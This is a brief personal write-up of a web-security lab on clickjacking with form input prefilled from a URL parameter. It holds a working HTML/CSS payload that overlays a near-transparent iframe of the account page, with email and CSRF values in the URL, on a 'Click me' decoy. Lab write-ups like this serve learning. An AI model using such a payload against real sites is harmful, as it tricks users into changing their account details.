# [ClickJacking] Lab: Clickjacking with form input data prefilled from a URL parameter (1)

---

![Untitled](%5BClickJacking%5D%20Lab%20Clickjacking%20with%20form%20input%20da%2051b521c5bacc48e4aad18806933c8c8c/Untitled.png)

would this work as get request? 

![Untitled](%5BClickJacking%5D%20Lab%20Clickjacking%20with%20form%20input%20da%2051b521c5bacc48e4aad18806933c8c8c/Untitled%201.png)

well not exactly the `/changeEmail`  only accepts POST 

but this worked: 

![Untitled](%5BClickJacking%5D%20Lab%20Clickjacking%20with%20form%20input%20da%2051b521c5bacc48e4aad18806933c8c8c/Untitled%202.png)

```jsx
<head>
	<style>
		#target_website {
			position:relative;
			width:508px;
			height:700px;
			opacity:0.10001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			left:100px;
			top:450px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	Click me
	</div>
	<iframe id="target_website" src="https://0a17005304ec17fa807880d400300016.web-security-academy.net/my-account?email=lab%40t.com&csrf=Sb0TOe9xJsveMPSQKORMlKLGet849tYU">
	</iframe>
</body>
```

this was the payload

 

![Untitled](%5BClickJacking%5D%20Lab%20Clickjacking%20with%20form%20input%20da%2051b521c5bacc48e4aad18806933c8c8c/Untitled%203.png)